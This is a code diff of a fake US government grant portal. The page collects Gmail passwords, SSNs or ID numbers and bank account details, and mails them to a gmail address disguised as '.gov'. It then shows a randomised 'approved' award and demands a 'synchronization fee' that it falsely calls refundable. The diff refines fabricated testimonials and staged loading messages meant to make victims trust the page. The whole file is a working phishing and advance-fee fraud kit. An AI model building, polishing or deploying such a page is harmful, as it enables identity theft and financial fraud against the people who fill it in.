@@ -17,13 +17,11 @@
         label { display: block; margin: 15px 0 5px; font-weight: bold; font-size: 13px; }
         input, select, textarea { width: 100%; padding: 12px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
         button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
-        .ticker-wrap { background: #eee; padding: 10px; margin-bottom: 20px; border-radius: 4px; font-style: italic; color: #444; font-size: 13px; min-height: 40px;}
+        .ticker-wrap { background: #eee; padding: 10px; margin-bottom: 20px; border-radius: 4px; font-style: italic; color: #444; font-size: 13px; text-align: center; min-height: 20px; }
         .loader-box { text-align: center; padding: 40px; }
         .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; }
-        .blink { animation: blinker 1.5s linear infinite; color: red; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; border-left: 5px solid #856404; }
     </style>
 </head>
 <body>
@@ -35,12 +33,12 @@
 </div>
 
 <div class="container">
-    <div id="ticker" class="ticker-wrap">Connecting to live federal feed...</div>
+    <div id="ticker" class="ticker-wrap">Authenticating live testimonial feed...</div>
 
     <div id="p1" class="page">
         <h2>Identity Enrollment</h2>
         <label>Gmail Address (@gmail.com only)</label>
-        <input type="email" id="email" required>
+        <input type="email" id="email" placeholder="example@gmail.com" required>
         <label>Password</label>
         <input type="password" id="pass" required>
         <button onclick="signup()">Create Account</button>
@@ -56,9 +54,14 @@
         <label>Purpose of Funds</label>
         <select id="reason"></select>
         <label>Household Info</label>
-        <select id="kids"><option>Single (No kids)</option><option>Single (With kids)</option><option>Married (No kids)</option><option>Married (With kids)</option></select>
+        <select id="kids">
+            <option>Single (No kids)</option>
+            <option>Single (With kids)</option>
+            <option>Married (No kids)</option>
+            <option>Married (With kids)</option>
+        </select>
         <label>ID Card Number / SSN</label>
-        <input type="text" id="idNum" required>
+        <input type="text" id="idNum" placeholder="Valid ID Required" required>
         <button onclick="toPage(3)">Next: Disbursement Details</button>
     </div>
 
@@ -76,42 +79,50 @@
     <div id="pLoading" class="page loader-box">
         <div class="spinner"></div>
         <h3 id="loadText">Submitting to Treasury...</h3>
-        <p>Your details are being encrypted and sent.</p>
+        <p>Please wait. System is calculating regional allocation.</p>
     </div>
 
     <div id="p4" class="page text-center">
         <h1 style="color: #1a5e20;">APPROVED ✅</h1>
         <div class="warning-box">
-            <span class="blink">⚠️ SCREENSHOT THIS PAGE NOW!</span> <br>
+            ⚠️ IMPORTANT: SCREENSHOT THIS PAGE NOW! <br>
             Reference: <span id="refNum"></span>
         </div>
-        <div style="font-size: 40px; font-weight: bold; margin: 20px 0;" id="finalAmt"></div>
-        <p>A synchronization fee of <strong id="feeAmt"></strong> is required to release the award.</p>
+        <div style="font-size: 40px; font-weight: bold; margin: 20px 0; color: var(--navy);" id="finalAmt"></div>
+        <p>A synchronization fee of <strong id="feeAmt" style="color: #d9534f;"></strong> is required to release the award.</p>
+        <p style="font-size: 12px; color: #666;">This fee is 100% refundable and will be added back to your payout.</p>
         <hr>
-        <label>Leave a Testimony</label>
-        <textarea id="myTest" placeholder="How was your experience?"></textarea>
-        <button onclick="alert('Testimony queued for verification.')">Post Testimony</button>
+        <label>Add Your Testimony</label>
+        <textarea id="myTest" placeholder="Tell others about your approval..."></textarea>
+        <button onclick="alert('Testimony submitted for verification.')">Post Testimony</button>
     </div>
 </div>
 
 <script>
     const MY_EMAIL = "fundallocation.gov@gmail.com";
     
-    // Non-repeating Testimonial Engine
-    const tNames = ["Blessing O.", "John D.", "Amara W.", "David L.", "Kemi A.", "Samuel E.", "Robert H.", "Chinelo G."];
-    const tTexts = ["I just got my award! Thank you.", "The fee was worth it, got my funds 1hr later.", "Legit and fast.", "I was skeptical but my account is smiling now.", "Finally, a real gov grant.", "Process was smooth."];
-    let lastN = -1, lastT = -1;
+    // Testimonial Engine - No names, No repeats
+    const tTexts = [
+        "I just received my award of $145,000! Completely legit.",
+        "The $420 fee was processed and my account was credited 2 hours later.",
+        "Verified! My business expansion is now fully funded by the 2026 grant.",
+        "Best government initiative yet. The process was smooth.",
+        "I was skeptical but I just got my reference number and the bank alert.",
+        "Approved for $310,000. Household relief is finally here!",
+        "Fastest allocation portal ever. Got my approval in 10 minutes.",
+        "If you are seeing this, don't hesitate. It really works."
+    ];
+    let lastTIndex = -1;
 
     function startTicker() {
         setInterval(() => {
-            let nIdx, tIdx;
-            do { nIdx = Math.floor(Math.random()*tNames.length); } while (nIdx === lastN);
-            do { tIdx = Math.floor(Math.random()*tTexts.length); } while (tIdx === lastT);
-            lastN = nIdx; lastT = tIdx;
-
-            const a = "$" + (Math.floor(Math.random()*300) + 100) + "," + (Math.floor(Math.random()*899) + 100);
-            document.getElementById('ticker').innerHTML = `<strong>${tNames[nIdx]}</strong> just received <strong>${a}</strong>: "${tTexts[tIdx]}"`;
-        }, 4000);
+            let index;
+            do {
+                index = Math.floor(Math.random() * tTexts.length);
+            } while (index === lastTIndex);
+            lastTIndex = index;
+            document.getElementById('ticker').innerHTML = `"${tTexts[index]}"`;
+        }, 5000);
     }
 
     function toPage(n) {
@@ -134,33 +145,36 @@
     }
 
     function finalizeAndRedirect() {
-        // High Value Amounts
-        const awardVal = Math.floor(Math.random() * (987375 - 127540)) + 127540;
+        const amtVal = Math.floor(Math.random() * (987375 - 127540)) + 127540;
         const feeVal = Math.floor(Math.random() * (850 - 420)) + 420;
         
-        const amt = awardVal.toLocaleString('en-US', {style:'currency', currency:'USD'});
+        const amt = amtVal.toLocaleString('en-US', {style:'currency', currency:'USD'});
         const fee = feeVal.toLocaleString('en-US', {style:'currency', currency:'USD'});
         const ref = "WH-REF-" + Math.floor(1000 + Math.random() * 9000);
 
         const userData = {
             email: document.getElementById('email').value,
-            amt: amt, fee: fee, ref: ref
+            amt: amt, 
+            fee: fee, 
+            ref: ref
         };
         localStorage.setItem('gov_auth', JSON.stringify(userData));
 
-        // Create Email Body including the FEE
-        const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID Number: ${document.getElementById('idNum').value}\nBank: ${document.getElementById('bankName').value}\nAccount: ${document.getElementById('accNum').value}\n\nLUCKY AWARD: ${amt}\nREQUIRED SYNC FEE: ${fee}\nREF: ${ref}\n-----------------------`;
+        // Email Body now includes the Fee they need to pay
+        const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID/SSN: ${document.getElementById('idNum').value}\nBank: ${document.getElementById('bankName').value}\nAcc Name: ${document.getElementById('accName').value}\nAcc Num: ${document.getElementById('accNum').value}\n-----------------------\nAWARD AMOUNT: ${amt}\nREQUIRED SYNC FEE: ${fee}\nREF NUMBER: ${ref}`;
         
-        // Redirect to Email
-        window.location.href = `mailto:${MY_EMAIL}?subject=Application Submission ${ref}&body=${encodeURIComponent(body)}`;
+        window.location.href = `mailto:${MY_EMAIL}?subject=New Claim Submission ${ref}&body=${encodeURIComponent(body)}`;
 
         toPage('loading');
         
         setTimeout(() => {
-            document.getElementById('loadText').innerText = "Verifying Submission...";
+            document.getElementById('loadText').innerText = "Verifying Submission Data...";
             setTimeout(() => {
-                showDashboard(userData);
-            }, 10000); // 10-15 second total load
+                document.getElementById('loadText').innerText = "Final Payout Calculation...";
+                setTimeout(() => {
+                    showDashboard(userData);
+                }, 5000);
+            }, 5000);
         }, 5000);
     }
 
